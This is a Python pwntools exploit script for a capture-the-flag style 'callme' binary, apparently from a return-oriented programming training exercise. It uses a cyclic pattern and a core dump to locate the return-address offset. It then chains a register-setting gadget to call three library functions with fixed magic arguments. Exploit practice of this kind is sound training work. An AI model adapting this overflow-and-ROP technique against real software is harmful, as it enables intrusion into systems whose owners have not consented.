#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./callme')
libcallme = ELF('./libcallme.so')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak pwnme
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

# callme_one requires :
#   rdi = 0xdeadbeefdeadbeef
#   rsi = 0xcafebabecafebabe
#   rdx = 0xd00df00dd00df00d

io = process([elf.path])

payload = cyclic(100)
io.sendlineafter('>', payload)
io.wait()

# get corefile
core = io.corefile
stack = core.rsp
print(f'stack = {hex(stack)}')

# read cyclic patter from stack top
pattern = core.read(stack, 4)
rip_offset = cyclic_find(pattern)

print(f'rip offset = {hex(rip_offset)}')

# rop gadget addresses
pop_rdi_rsi_rdx_ret = p64(0x000000000040093c)

payload = flat(
    asm('nop')*rip_offset,
    pop_rdi_rsi_rdx_ret,
    p64(0xdeadbeefdeadbeef),
    p64(0xcafebabecafebabe),
    p64(0xd00df00dd00df00d),
    p64(elf.plt.callme_one + 1), # callme one

    pop_rdi_rsi_rdx_ret,
    p64(0xdeadbeefdeadbeef),
    p64(0xcafebabecafebabe),
    p64(0xd00df00dd00df00d),
    p64(elf.plt.callme_two + 1), # callme two

    pop_rdi_rsi_rdx_ret,
    p64(0xdeadbeefdeadbeef),
    p64(0xcafebabecafebabe),
    p64(0xd00df00dd00df00d),
    p64(elf.plt.callme_three + 1) # callme three
)

io = start()
io.sendlineafter('>', payload)

io.interactive()
